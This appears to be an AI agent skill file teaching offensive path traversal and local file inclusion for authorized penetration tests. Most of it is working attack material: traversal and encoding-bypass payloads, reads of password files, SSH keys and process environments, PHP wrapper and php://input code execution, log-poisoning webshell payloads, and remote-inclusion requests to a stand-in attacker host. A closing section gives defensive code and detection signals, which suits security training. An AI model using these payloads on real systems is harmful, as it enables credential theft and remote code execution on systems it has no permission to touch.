---
name: offensive-path-traversal
description: "Authorized offensive-security methodology for finding and exploiting path traversal and local file inclusion (LFI) during penetration tests and red-team engagements. You use this skill when a target maps user input onto a filesystem path, letting you read files outside an intended directory by walking up with dot-dot sequences, defeating weak filters through nested and overlong encoding, backslash substitution, and legacy null-byte truncation, supplying absolute paths, and abusing language wrappers to read source or logs. It frames how traversal differs from remote file inclusion, how to pivot from arbitrary read to code execution via log and session poisoning, and how defenders canonicalize then jail paths to a trusted root. It complements offensive-file-upload and offensive-idor. Uses only example.com and 192.0.2.0/24, cites CWE-22, CWE-23, OWASP, and PortSwigger."
---

# Path Traversal and Local File Inclusion

Path traversal (also called directory traversal) is what you get when an
application takes a piece of attacker-controlled input and uses it, directly or
after some half-hearted sanitization, to build a path that it then hands to a
filesystem API. If the code expects `report.pdf` and you give it
`../../../../etc/passwd`, and the server happily returns the contents of
`/etc/passwd`, you have traversal. The vulnerability class is catalogued as
[CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html),
with [CWE-23: Relative Path Traversal](https://cwe.mitre.org/data/definitions/23.html)
covering the dot-dot-slash variant specifically.

You use this skill on authorized engagements only. Everything below assumes you
have a signed scope that covers the target. All examples use `example.com` and
the documentation range `192.0.2.0/24` (RFC 5737) so that nothing here points at
a real victim. Do not substitute real domains, real internal hostnames, or real
credentials when you adapt these payloads.

Traversal matters because it is a gateway. A raw arbitrary-file-read is already
high severity: you can pull configuration files with database passwords, private
keys, cloud credentials, and source code. But traversal frequently escalates to
remote code execution through log poisoning, session-file inclusion, or wrapper
abuse, so treat every confirmed read as a foothold rather than an endpoint.

This skill is complementary to two others you should reach for when the shape of
the bug changes:

- **offensive-file-upload** — when you control a file that lands on disk and you
  want to influence *where* it lands or get it interpreted. Upload plus traversal
  in the filename is a classic chain, but the upload-specific mechanics live in
  that skill. Mention it, pivot to it, but do not re-derive its payloads here.
- **offensive-idor** — when the path parameter is really an object reference and
  the problem is missing authorization rather than filesystem escape. If
  `?file=1002.pdf` just needs to become `1003.pdf` to read another tenant's
  document, that is IDOR, not traversal. Know the boundary.

## Quick Workflow

Work through this loop whenever a parameter looks like it feeds a file path.

1. **Find the sinks.** Hunt for parameters whose values look like filenames,
   paths, templates, or resource identifiers: `?file=`, `?page=`, `?doc=`,
   `?template=`, `?lang=`, `?download=`, `?path=`, `?include=`, `?view=`. Also
   check path segments (`/assets/images/logo.png`), `Content-Disposition`
   filenames, PDF/report generators, and any "export" or "preview" feature.
2. **Establish a baseline.** Request the legitimate value and record the exact
   response: status, length, content-type, and body. You are looking for
   deviations from this baseline, so capture it precisely.
3. **Probe for traversal.** Inject a single `../` and then a deep stack of them
   against a known-stable target file. On Linux target `/etc/passwd`; on Windows
   target `C:\Windows\win.ini` or `C:\Windows\System32\drivers\etc\hosts`.
4. **Confirm the read.** A successful read shows recognizable content
   (`root:x:0:0:` for `/etc/passwd`, `[fonts]`/`[extensions]` for `win.ini`).
   Length and timing deltas are weaker signals — corroborate them.
5. **Defeat filters.** If the naive payload fails, escalate through the bypass
   ladder: encoding, double encoding, overlong UTF-8, backslashes, prefix
   stripping tricks, absolute paths, and (on legacy stacks) null bytes.
6. **Map the blast radius.** Once you can read, enumerate high-value files:
   credentials, keys, source, and logs. Note what you *cannot* read to infer the
   jail boundary and the service account's privileges.
7. **Escalate if in scope.** Attempt read-to-RCE via log poisoning, session
   inclusion, or wrappers, but only where your rules of engagement permit it.
8. **Document with evidence.** Capture the exact request, the raw response, and a
   minimal reproducer. Severity rides on *what* you read, not just that you read.

```http
GET /download?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com
```

A positive hit looks like this in the response body:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

## Relative Path Traversal

The core technique is walking up the directory tree with `../` (POSIX) or `..\`
(Windows) until you reach the filesystem root, then walking back down to the
target. You over-supply the up-steps on purpose: appending too many `../` is
harmless because `/..` at the root resolves to the root itself, so a deep stack
works regardless of how many directories deep the application's base path sits.

```http
GET /loadImage?filename=../../../etc/passwd HTTP/1.1
Host: example.com
```

If you do not know the depth, saturate it:

```text
../../../../../../../../../../etc/passwd
```

Windows accepts both separators, and mixing them is a reliable way to slip past
filters that only know about one:

```text
..\..\..\..\windows\win.ini
../../../../windows/win.ini
..\../..\../windows\win.ini
```

Think carefully about *where* your input is concatenated. Three common shapes:

- **Suffix concatenation:** `base + input` → `"/var/www/images/" + filename`.
  Straight `../` traversal works.
- **Prefix concatenation:** `input + suffix` → the app appends `.php` or a
  directory. Here you need the null-byte or path-truncation tricks below, or a
  wrapper, to shed the forced suffix.
- **Full replacement:** your input becomes the entire path. Absolute paths (next
  section) are the cleanest route.

PortSwigger's write-up of these cases is the canonical reference; see
[Web Security Academy: Directory traversal](https://portswigger.net/web-security/file-path-traversal)
and the broader [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
article for the attack taxonomy.

## Encoding and Normalization Bypasses

Most real targets have *some* filter. The game is getting a `../` to survive the
application's inspection but still mean "parent directory" by the time it reaches
the OS. The reason this works is a mismatch: the filter inspects one
representation of the string, and the decoder/normalizer that runs later produces
a different, dangerous one.

### Single URL encoding

Encode the dot-dot-slash so a naive string filter for the literal `../` misses
it, while the web server's URL decoder restores it before filesystem access.

```text
%2e%2e%2f      ->  ../
%2e%2e/        ->  ../
..%2f          ->  ../
%2e%2e%5c      ->  ..\   (Windows)
```

```http
GET /loadImage?filename=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: example.com
```

### Nested (double) encoding

This is the single most useful bypass to keep in your pocket. If the platform
URL-decodes the input *before* the filter runs, a single encoding is undone and
caught. So you encode twice: the first decode pass turns `%252e` into `%2e`,
which passes the filter because it is not yet a dot, and a second decode pass
(often in a downstream component) turns it into `.`.

```text
%252e%252e%252f   ->  (decode once) %2e%2e%2f  ->  (decode twice) ../
%252e%252e%255c   ->  ..\
```

```http
GET /loadImage?filename=%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
Host: example.com
```

You can also nest unevenly — `%2e%252e%2f` and similar — when only one component
in the chain double-decodes. Fuzz the combinations rather than assuming a single
canonical form.

### Overlong UTF-8 encoding

UTF-8 defines exactly one valid byte sequence per code point, but a lenient or
buggy decoder may accept *overlong* encodings that pad a character into more
bytes than necessary. The ASCII `/` (U+002F) and `.` (U+002E) have multi-byte
overlong forms that a strict filter checking for the one-byte version never
recognizes, yet a sloppy decoder folds back to the dangerous character.

```text
/   ->  %c0%af           (two-byte overlong)
/   ->  %e0%80%af        (three-byte overlong)
.   ->  %c0%ae
..  ->  %c0%ae%c0%ae
../ ->  %c0%ae%c0%ae%c0%af
```

```http
GET /loadImage?filename=%c0%ae%c0%ae%c0%afetc%c0%afpasswd HTTP/1.1
Host: example.com
```

Overlong encodings are the mechanism behind several historically devastating
bugs (the IIS Unicode directory-traversal worms abused exactly this). Modern
decoders reject them, so treat overlong UTF-8 as a probe for legacy or custom
decoding layers rather than a reliable primary.

### Backslash and separator confusion

On Windows, `\` and `/` are interchangeable at the OS level, but application
filters and allow-lists are frequently written with only one in mind. Even some
Linux-hosted frameworks and libraries (and Java on Windows) normalize `\` to `/`
late in processing. Rotate separators and their encodings:

```text
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
..%255c..%255cwindows%255cwin.ini
....\\....\\windows\\win.ini
```

### Prefix- and sequence-stripping bypass

Some filters strip `../` exactly once, non-recursively. You defeat that by
nesting the sequence so that removing the inner one reconstitutes a fresh outer
one.

```text
....//            ->  (strip "../") ->  ../
....\/            ->  ../
..././           ->  ../
%2e%2e%2f variants nested the same way
```

```http
GET /loadImage?filename=....//....//....//etc/passwd HTTP/1.1
Host: example.com
```

### Absolute-prefix requirement bypass

When an application insists the path *start* with an expected base directory
(e.g., it checks that input begins with `/var/www/images/`), you can often still
traverse by including the required prefix and then walking out of it:

```text
/var/www/images/../../../etc/passwd
```

### Null byte truncation (legacy)

Historically, when an application forced a suffix such as `.php` onto your input,
you could terminate the string early with a URL-encoded null byte so the OS
ignored everything after it. The C string underneath treats `\0` as end-of-string
even though the higher-level language kept appending bytes.

```text
../../../../etc/passwd%00
../../../../etc/passwd%00.php
```

This was fixed in PHP 5.3.4 (2010) and does not work on current mainstream
runtimes. Keep it in your kit strictly for genuinely old targets and legacy
embedded devices — if a scope includes antique firmware, it is still worth one
probe. Do not expect it to work on anything modern, and do not let it distract
you from the encoding bypasses that do.

## Absolute Paths

When the application uses your input as the whole path (no base directory
prepended), you do not need any `../` at all — just name the file outright. This
is cleaner, avoids depth guessing, and sidesteps every filter that looks
specifically for traversal sequences.

```http
GET /download?file=/etc/passwd HTTP/1.1
Host: example.com
```

```text
/etc/passwd
/etc/shadow                         (needs privilege; usually denied)
/proc/self/environ                  (process env; sometimes poisonable)
/proc/self/cmdline
/var/log/auth.log
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

On Linux the `/proc` pseudo-filesystem is a goldmine for an arbitrary read:
`/proc/self/environ` leaks environment variables (often including secrets),
`/proc/self/cmdline` reveals how the process was launched, and
`/proc/self/cwd/` combined with a relative path can anchor you to the working
directory. These files are also central to several RCE pivots.

## Wrapper-Style Local File Reads

PHP's stream wrappers turn a plain file parameter into a far more powerful
primitive whenever user input reaches `include`, `require`, `file_get_contents`,
`fopen`, or similar. This is the heart of **local file inclusion (LFI)** as
distinct from bare traversal: you are not just reading a file, you are feeding it
to an interpreter or transforming it in flight.

### php://filter — read source without executing it

If the sink *includes* the file (so a `.php` target would normally execute and
you would see its output, not its code), wrap it in a filter to base64-encode the
contents first. The interpreter base64s the raw bytes instead of running them, and
you decode the source offline.

```http
GET /index.php?page=php://filter/convert.base64-encode/resource=config HTTP/1.1
Host: example.com
```

```bash
# decode the captured blob locally
echo 'PD9waHAgJGRiX3Bhc3M9...' | base64 -d
```

This reliably exfiltrates application source, which frequently contains database
credentials, API keys, and the logic you need to find the next bug.

### data:// and php://input — toward code execution

Where `allow_url_include` is enabled (uncommon but not extinct), `data://` and
`php://input` let you supply code directly to an `include` sink:

```http
GET /index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ HTTP/1.1
Host: example.com
```

```http
POST /index.php?page=php://input HTTP/1.1
Host: example.com
Content-Type: text/plain

<?php system('id'); ?>
```

### zip:// and phar:// — inclusion from archives

If you can place an archive on disk (often via a benign-looking file upload — see
**offensive-file-upload**), `phar://` and `zip://` wrappers can include a file
*inside* that archive, and `phar://` deserialization can trigger code execution
during metadata parsing. This is the canonical traversal-meets-upload chain:
upload gets bytes on disk, traversal/LFI gives you the interpreter.

### Log and session poisoning — read-to-RCE

A pure read wrapper becomes RCE when you can first write attacker-controlled
bytes into a file the interpreter will later include:

- **Log poisoning:** send a request whose `User-Agent` (or other logged field)
  contains `<?php system($_GET['c']); ?>`, then LFI the log file
  (`/var/log/apache2/access.log`, `/var/log/nginx/access.log`). The interpreter
  executes your payload as it includes the log.
- **Session poisoning:** get your payload stored in a PHP session file
  (`/var/lib/php/sessions/sess_<ID>` or `/tmp/sess_<ID>`), then include it.
- **`/proc/self/environ`:** on some old stacks, a poisoned `User-Agent` lands in
  the process environment and is includable.

Only perform these where your rules of engagement explicitly authorize code
execution on the target. Writing a webshell, even transiently, is a material
action — get it in scope and in writing first.

## Traversal vs. Remote File Inclusion

Keep these two straight because they have different root causes, severities, and
fixes:

- **Local File Inclusion / traversal** reads or includes files *already on the
  target's disk*. The attacker-controlled part is the path. Severity depends on
  what is readable and whether you can pivot to execution via local primitives.
- **Remote File Inclusion (RFI)** happens when the sink will fetch and include a
  *remote* URL you supply — `?page=http://192.0.2.10/shell.txt`. That is
  immediate, straightforward code execution because your payload never had to be
  on the target first. RFI requires permissive settings (in PHP,
  `allow_url_include=On`), which have been off by default for many years, so you
  will meet it far less often than LFI.

```http
GET /index.php?page=http://192.0.2.10/evil.txt HTTP/1.1
Host: example.com
```

The quick test: if pointing the parameter at an attacker-controlled host (within
scope) causes the server to make an outbound request to you, you have RFI. If it
only ever resolves against the local filesystem, you have LFI/traversal. The two
can coexist, but the fixes differ — RFI is fundamentally about never fetching
remote resources from user input.

## Detection / Defender View

When you write up findings, give the blue team a remediation path that actually
holds, not a block-list they will out-maneuver next quarter. The failure mode in
every traversal bug is the same: the application inspects one form of the input
but acts on another. Fix it by collapsing that gap.

**Canonicalize, then jail to a root.** Resolve the fully canonical absolute path
*first* (following `..`, symlinks, and all encoding), then verify the result is
still inside the intended base directory. Validate the canonical form, never the
raw input.

```python
import os

BASE = "/var/www/user-files"

def safe_open(user_supplied_name):
    # Canonicalize first: resolve .., symlinks, and normalize separators.
    candidate = os.path.realpath(os.path.join(BASE, user_supplied_name))
    base = os.path.realpath(BASE)
    # Jail check: the resolved path must sit under the trusted root.
    if os.path.commonpath([candidate, base]) != base:
        raise PermissionError("path escapes the allowed root")
    return open(candidate, "rb")
```

```java
Path base = Paths.get("/var/www/user-files").toRealPath();
Path candidate = base.resolve(userSuppliedName).normalize().toRealPath();
if (!candidate.startsWith(base)) {
    throw new SecurityException("path escapes the allowed root");
}
```

Core defensive guidance to cite in the report:

- **Canonicalize before you validate.** Decode all layers and resolve the path to
  its real absolute form, *then* run the allow-list/jail check against that
  canonical value. Checking the raw string is the original sin.
- **Deny absolute paths outright.** Reject any input that is already absolute
  (`/etc/passwd`, `C:\...`, or a UNC `\\host\share`) instead of trying to prepend
  a base to it.
- **Prefer indirection over raw filenames.** Map an opaque identifier to a
  server-side path (a lookup table or database row) so user input never touches a
  filesystem API at all. This is the strongest fix and it also closes the IDOR
  overlap — see **offensive-idor** for the authorization dimension.
- **Use an allow-list, not a block-list.** Restrict to a known set of filenames
  or a strict character class (e.g., `[A-Za-z0-9_-]` plus one extension). Block-
  lists of `../` lose to the encoding tricks above.
- **Run with least privilege.** The service account should not be able to read
  `/etc/shadow`, private keys, or other tenants' data even if traversal exists;
  containerization and chroot/jails limit blast radius.

Detection signals for monitoring:

- Requests containing `../`, `..\`, or their encoded forms (`%2e`, `%2f`, `%5c`,
  `%252e`, `%c0%ae`) in parameters or path segments.
- Requests for sensitive filenames (`/etc/passwd`, `win.ini`, `web.config`,
  `.env`, `id_rsa`) and PHP wrapper schemes (`php://`, `data://`, `phar://`).
- Responses whose size or content-type deviates sharply from the endpoint's
  baseline — a file download endpoint suddenly returning `text/plain` shaped like
  a Unix passwd file is a strong tell.

See the mitigation guidance in
[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
and [CWE-22's potential mitigations](https://cwe.mitre.org/data/definitions/22.html).

## Engagement Cheatsheet

Fast reference for live testing. Swap target files to match the host OS.

```text
# Baseline probes
../../../../../../etc/passwd
..\..\..\..\..\windows\win.ini
/etc/passwd
C:\Windows\System32\drivers\etc\hosts

# Encoding ladder (apply to each ../ )
%2e%2e%2f                     single URL-encode
%252e%252e%252f               double (nested) URL-encode
%c0%ae%c0%ae%c0%af            overlong UTF-8
..%5c  /  ..%255c             backslash + encoded backslash
....//                        sequence-strip bypass
....\/                        mixed sequence-strip

# Suffix shedding (legacy / forced-extension sinks)
../../../../etc/passwd%00
../../../../etc/passwd%00.php

# Prefix-required bypass
/var/www/images/../../../etc/passwd

# High-value read targets (Linux)
/etc/passwd
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/www/html/.env
~/.ssh/id_rsa

# High-value read targets (Windows)
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\Windows\System32\config\SAM        (locked while running)
C:\Users\Administrator\.ssh\id_rsa

# PHP wrapper primitives
php://filter/convert.base64-encode/resource=config
data://text/plain;base64,<payload>
php://input                            (POST body as code)
phar://upload.zip/shell.php            (chain with offensive-file-upload)

# RFI test (distinguish from LFI) — use scoped attacker host only
http://192.0.2.10/evil.txt
```

Workflow reminders:

- Always record the baseline response before injecting; you are hunting for a
  delta.
- If naive `../` fails, climb the encoding ladder before concluding "not
  vulnerable."
- Decide read-only vs. RCE pivot based on your rules of engagement, not
  opportunism.
- When the bug is really "wrong file, same mechanism," check whether it is
  actually IDOR; when it is "I control a file on disk," bring in file-upload.

## Key References

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-23: Relative Path Traversal](https://cwe.mitre.org/data/definitions/23.html)
- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP Web Security Testing Guide: Testing for Directory Traversal / File Include](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy: Directory traversal](https://portswigger.net/web-security/file-path-traversal)
- [PortSwigger Web Security Academy: File path traversal labs](https://portswigger.net/web-security/all-labs#directory-traversal)
- RFC 5737 — IPv4 Address Blocks Reserved for Documentation (`192.0.2.0/24`)

Related skills in this kit: **offensive-file-upload** (getting attacker bytes
onto disk, then chaining into LFI) and **offensive-idor** (when a path parameter
is really a missing-authorization object reference). Use them together; do not
duplicate their payloads here.
